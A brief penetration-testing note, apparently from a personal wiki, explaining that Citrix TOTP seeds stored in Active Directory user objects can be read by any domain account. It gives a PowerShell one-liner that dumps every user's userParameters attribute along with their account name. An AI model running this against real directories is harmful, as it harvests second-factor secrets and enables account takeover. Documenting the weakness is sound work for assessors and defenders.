# Citrix TOTP Seeds in AD Objects
Sometimes access to the Citrix Web Interface can be secured with 2FA. If it is TOTP, then Citrix will recommend that the seeds are stored in the AD objects of the respective users.
It is possible to read the seeds if you have any AD account, privileges don't seem to matter.
```powershell
([adsisearcher]"Userparameters+*#*&*").FindAll() | %{write-output "$($_.Properties['samaccountname'] + $_.Properties['userparameters'])"} | sort-object
```

tags: #citrix #windows #pentest